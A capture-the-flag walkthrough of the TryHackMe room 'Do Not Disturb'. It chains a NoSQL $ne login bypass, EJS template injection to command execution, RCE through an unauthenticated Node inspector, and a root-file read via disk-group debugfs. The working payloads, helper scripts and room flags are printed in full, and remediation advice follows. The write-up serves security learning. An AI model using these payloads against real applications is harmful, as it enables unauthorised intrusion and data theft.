---
title: TryHackMe Do Not Disturb — Four Doors, None of Them Locked
date: 2026-08-05T13:00:00+05:30
lastmod: 2026-08-05T13:00:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-donotdisturb/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Web
  - Boot2Root
  - NoSQL Injection
  - SSTI
  - Node.js
  - Privilege Escalation
  - disk group

draft: false
description: "Walkthrough of the TryHackMe room Do Not Disturb — NoSQL login bypass to EJS SSTI to RCE, a Node inspector for lateral movement, and the disk group for root."
---

## Do Not Disturb

**Day 7 of Hacker Holidays 2026**, and the Byte Lotus finally hands over a full boot2root. The briefing sets an ominous tone:

> Sign's on the door. Room's active. **You have access you were never given, and so does he.**
>
> The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.

Category is Web / Boot2Root, difficulty Medium, 90 points. Two flags. And the theme — *access you were never given*, *a warm session*, *someone already inside* — turns out to be a precise description of the chain: an authentication you bypass, a session you inherit, and a foothold someone left warm.

This is a four-stage chain, so I'll keep each stage to its own idea:

1. **NoSQL injection** bypasses the login.
2. **EJS template injection** in the staff console gives code execution.
3. A **Node.js inspector port** on localhost moves you laterally to a second account.
4. That account's **`disk` group** membership reads root's flag straight off the raw device.

## Step 1: A tiny app with one locked door

Two ports: SSH (22) and HTTP (80). The web app is Express (`X-Powered-By` gives it away) and titled "Byte Lotus — Poolside." The landing page is a login form with the tagline *"The pool remembers your usual."*

Content discovery is quick because there's almost nothing to find:

![nmap showing SSH and HTTP, and ffuf finding only /logout returning 302 and /staff returning 403 Staff access only](/img/thm-donotdisturb/01-recon.png)

```
/logout   302
/staff    403   -> "Staff access only."
```

That's the whole app: the login, `/logout`, and a `/staff` area that returns **403** unless you're staff. No registration, no other endpoints. When an app is this small, the vulnerability is almost never a forgotten page — it's in the one form you were handed. So the login gets the attention.

## Step 2: The login is a database query wearing a costume

The first thing I try on any login before touching a wordlist is injection — SQL, then NoSQL. SQL payloads all returned `401`. NoSQL operator injection did not:

![curl posting username with a dollar-ne operator and password with a dollar-ne operator, receiving a 302 redirect to /staff and a session cookie](/img/thm-donotdisturb/02-nosql.png)

```bash
curl -i -X POST http://$T/login --data 'username[$ne]=x&password[$ne]=x'
```

```
HTTP/1.1 302 Found
Location: /staff
Set-Cookie: connect.sid=s%3AxP_Ts...; HttpOnly
```

A **302 to `/staff`** with a session cookie — logged in, no credentials. Later, reading the app source confirmed exactly why:

```js
const db = new Datastore();                       // @seald-io/nedb
// ...
user = await db.findOneAsync({ username, password });
```

The backend is **NeDB**, an embedded datastore with a MongoDB-style query API. Express's `urlencoded({ extended: true })` parser turns `username[$ne]=x` into the **object** `{ $ne: "x" }`, and that object is dropped straight into the query. So the lookup becomes:

```js
db.findOneAsync({ username: { $ne: "x" }, password: { $ne: "x" } })
```

`$ne` means "not equal." This asks for the first record whose username isn't `"x"` and whose password isn't `"x"` — which is simply **the first user in the database**. That's the seeded `attendant` account, whose role is `staff`.

The elegance of the room is in what this bypasses. The source seeds `attendant` with `crypto.randomBytes(18).toString('hex')` — a 36-character random password. It is uncrackable and unguessable. But you never touch it: `$ne` doesn't compare the password, it *skips the comparison entirely*. **The strength of a password is irrelevant when the query can be told not to check it.**

*Why does this happen?* Because the raw request body was trusted to be a string and was handed to the query builder as-is. The fix is one line — cast the inputs, `String(req.body.username)`, so `{$ne:...}` collapses to the harmless string `"[object Object]"`.

## Step 3: The staff console renders whatever you type

The `/staff` page is a "Cabana Desk" with one feature: a box to customise the guest booking-confirmation message, which it calls an **EJS template** and previews via `POST /staff/preview`. An app that takes a *template* from the user and renders it server-side is the textbook setup for **server-side template injection**.

The canonical probe is arithmetic — if `7*7` comes back as `49`, the input is being evaluated, not printed:

![preview of 7 times 7 returning 49 in the confirmation message, then typeof process.mainModule.require returning function, then a child_process execSync id call returning uid 996 poolside](/img/thm-donotdisturb/03-ssti.png)

```
preview '<%= 7*7 %>'   ->   Dear 49, your Byte Lotus cabana is confirmed.
```

Evaluated. EJS's `<%= %>` runs JavaScript, so this is a path to RCE — but the obvious payload failed. `process.mainModule.require('child_process')` came back *unrendered*, because in the EJS execution context `require` and `module` are `undefined`. A quick probe of what the sandbox *does* expose:

```
<%= typeof require %>                        -> undefined
<%= typeof process %>                        -> object      (!)
<%= typeof process.mainModule.require %>     -> function    (!!)
```

`process` is reachable, and `process.mainModule` is the entry module — which carries a working `require`. That's the way through:

```
<%= process.mainModule.require('child_process').execSync('id') %>
-> uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

Code execution as **`poolside`**. The user flag is in that account's home:

```
cat /home/poolside/user.txt
```

> `THM{w4rm_s3ss10n_h1j4ck3d}`

The flag names the whole first half of the chain: a *warm session* — the pre-authenticated staff role — *hijacked* through an injection.

{{< ad >}}

To work comfortably from here I wrapped the preview endpoint in a small helper that re-authenticates with the `$ne` trick and base64-encodes each command so quoting never has to survive the EJS parser:

```python
def sh(cmd):
    b64 = base64.b64encode(cmd.encode()).decode()
    tpl = ("<%= process.mainModule.require('child_process')"
           f".execSync(\"echo {b64}|base64 -d|bash 2>&1\") %>")
    return preview(tpl, SID)
```

One caveat worth flagging, because it cost me a confusing moment: `execSync` **throws on any non-zero exit code**, and EJS then renders the *template source* instead of output. A command like `command -v foo || echo none` exits non-zero and looks like the injection broke. Appending `|| true`, or reading stderr with `2>&1`, keeps the channel clean.

## Step 4: Following his footprints — a debug port on localhost

`poolside` has no sudo and can't read `/root`. Time to enumerate. Two things stood out immediately, and one confirmed the room's "someone is already inside" framing.

In `poolside`'s home sits a `.viminfo` — vim's history file — recording that someone recently edited `/tmp/solve.js` with `:set paste` then `:wq`. That's the intruder's footprints, literally. The file itself is gone on a fresh boot, but it tells you there *was* a next step and points at where to look.

The listening ports name it:

![ss output showing node listening on 127.0.0.1:9229 as well as port 80, and the lotus-telemetry systemd unit running node with the inspect flag as user pipelinesvc](/img/thm-donotdisturb/04-inspector.png)

```
127.0.0.1:9229   node      <- --inspect
  0.0.0.0:80     node      (the poolside portal)
```

Port **9229** is the Node.js **inspector** — the debug interface behind `node --inspect`. A custom systemd unit explains it:

```ini
# /etc/systemd/system/lotus-telemetry.service
User=pipelinesvc
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

**A Node inspector is unauthenticated remote code execution by design.** It exists so a debugger can attach and run arbitrary JavaScript in the process — there is no password, only the assumption that "it's bound to localhost, so only local users can reach it." I *am* a local user now. And it runs as a **different** account, `pipelinesvc`, so attaching to it is a lateral move off the `poolside` account.

The catch: there's no `ws` library on the box to speak the DevTools WebSocket protocol. So I wrote a ~100-line client using only Python's standard library — it does the RFC6455 handshake by hand, sends one `Runtime.evaluate` frame, and reads the reply:

```python
expr = "require('child_process').execSync(" + json.dumps(CMD) + ").toString()"
send_text(sock, json.dumps({
    "id": 1, "method": "Runtime.evaluate",
    "params": {"expression": expr, "includeCommandLineAPI": True},
}))
```

Note that inside the inspected process `require` *is* defined — no `mainModule` dance needed, because you're evaluating in the module's own scope. Staged on the target and run:

```
python3 /tmp/.ir.py 'id'
-> uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

Now `pipelinesvc` — and look at the groups.

## Step 5: The disk group is root spelled differently

`groups=995(pipelinesvc),6(disk)`. That **`disk`** membership is the finish line, and it's a subtle one worth explaining because it doesn't look like a privilege at all.

Members of the `disk` group have read/write access to the raw block-device files in `/dev` — `/dev/nvme0n1p1` here, the partition holding the root filesystem. Unix file permissions like `/root/root.txt` being mode `0600` are enforced by the **filesystem layer**. But the disk group lets you bypass that layer entirely and read the **bytes of the disk directly**, where those permissions are just metadata you can walk past. Being in `disk` is, for practical purposes, equivalent to being root — you can read every file on the system, including `/etc/shadow`.

You don't even need to write a raw parser, because `debugfs` — the ext4 filesystem debugger — is installed and will do it for you:

![mount showing the root filesystem on /dev/nvme0n1p1, debugfs reading root.txt off the raw device to reveal the root flag, and a stat confirming the file is mode 0600 owned by uid 0](/img/thm-donotdisturb/05-disk-root.png)

```bash
mount | grep ' / '
# /dev/nvme0n1p1 on / type ext4 (rw)

debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1
```

> `THM{r4w_d1sk_4cc3ss_w4s_t00_much}`

No exploit, no race, no overflow. I never became root — I just read root's file out from under the permission system. To prove it really was privileged, `debugfs` also confirms the metadata I bypassed:

```
debugfs -R 'stat /root/root.txt' /dev/nvme0n1p1
# Mode: 0600   User: 0   Group: 0
```

Mode `0600`, owned by `uid 0` — a file `poolside` and `pipelinesvc` both get "Permission denied" on through the normal path, read anyway through the raw device. The flag says it plainly: **raw disk access was too much.**

## The chain, and why each link is a real-world pattern

Four distinct bugs, none exotic, each one common in production:

**NoSQL injection from an unvalidated body.** Any Mongo/NeDB app that passes `req.body` fields into a query without casting them to strings is vulnerable to operator injection. `$ne`, `$gt`, `$regex` — the query language becomes an authentication bypass. It's the NoSQL-era version of `' OR 1=1`, and it's everywhere because the body parser silently builds the object *for* you.

**SSTI from user-controlled templates.** The moment an application renders user input *as a template* rather than *as data*, every template engine's expression syntax becomes code execution. EJS, Handlebars, Jinja2, Twig, Freemarker — same class, different delimiters. "Let staff customise the email template" is a feature request that quietly means "let staff run code."

**A debug interface exposed to local users.** `--inspect` on localhost feels safe — it's not routable from outside. But "localhost-only" is not an authorization boundary on a multi-user box; it's an invitation to every account already on it. Inspector ports, Redis with no auth, `.sock` files with loose permissions — all the same mistake: trusting the network position instead of authenticating the caller.

**A service account in a powerful group.** Someone put `pipelinesvc` in `disk`, probably to let it read some device for "telemetry," without realising `disk` reads *every* device. `disk`, `docker`, `lxd`, `shadow`, `adm` — these groups are root-equivalent or nearly so. Group membership is the least-audited part of most privilege models, and it's where quiet escalation lives.

The through-line: **every single step trusted something it shouldn't have.** The query trusted the request body. The renderer trusted the template. The inspector trusted the network. The group grant trusted that "disk" sounded harmless. Follow the intruder's footprints and you're really just following a trail of misplaced trust.

## Fixing it

**Cast query inputs.** `db.findOneAsync({ username: String(req.body.username), password: String(req.body.password) })`. Better, hash passwords and compare the hash, so a password is never a query field at all. Schema-validate the body so operators can't appear.

**Never render user input as a template.** Treat the guest name as *data* passed to a fixed template — `render(FIXED_TEMPLATE, { guest })` — not as template source. If users genuinely need templating, use a logic-less engine (Mustache) in a real sandbox, and never EJS/Handlebars with user-authored source.

**Don't expose inspectors, and bind nothing sensitive to localhost on a shared host.** Debug with `--inspect` only on a workstation, never in a running service; if you must, protect it and tear it down. On multi-user systems, treat localhost services as reachable by every account.

**Audit group membership like you audit sudo.** Nobody should be in `disk`, `docker`, `lxd`, `shadow`, or `adm` unless that *is* their job, and such an account should be treated as root for threat-modelling. Run a periodic check for surprising memberships.

**And run each service as a minimal account** — which the box did do; `poolside` and `pipelinesvc` are separate and unprivileged. That segmentation is exactly why this was a *chain* and not a single step. It just wasn't enough on its own, because one of those accounts had a group it never needed.

## Room summary

| | |
|---|---|
| Room | Do Not Disturb |
| Event | Hacker Holidays 2026 — Day 7 |
| Category | Web · Boot2Root · Medium · 90 points |
| Target | `http://<lab-ip>` (Express / Node 22 / NeDB) |
| Foothold | NoSQL operator injection (`username[$ne]=x`) → staff session |
| RCE | EJS SSTI on `/staff/preview` via `process.mainModule.require` |
| User | `poolside` (uid 996) — flag `THM{w4rm_s3ss10n_h1j4ck3d}` |
| Lateral | Node `--inspect` on `127.0.0.1:9229` → `pipelinesvc` (uid 995) |
| Root | `pipelinesvc` in group `disk` → `debugfs` reads `/root/root.txt` off `/dev/nvme0n1p1` |
| Root flag | `THM{r4w_d1sk_4cc3ss_w4s_t00_much}` |

## Wrap-up

The whole box, compressed:

```bash
curl -X POST $T/login --data 'username[$ne]=x&password[$ne]=x'   # -> staff session
preview "<%= process.mainModule.require('child_process').execSync('id') %>"
python3 inspector_rce.py 'id'                                     # -> pipelinesvc (disk)
debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1                    # root flag
```

What makes this a satisfying room is that no stage was a leap. Each one was the *obvious* next question — try injection on the login, try template syntax in the template box, look at what's listening, read your own groups. The skill isn't knowing an exploit; it's refusing to stop at "403 Forbidden" or "uid 996" and asking what the box is trusting that it shouldn't.

*You have access you were never given, and so does he.* Someone walked this exact path before us — the `.viminfo` proves it. The room's lesson is that his path was never locked. Four doors, and every one was already open if you thought to push. 🪷
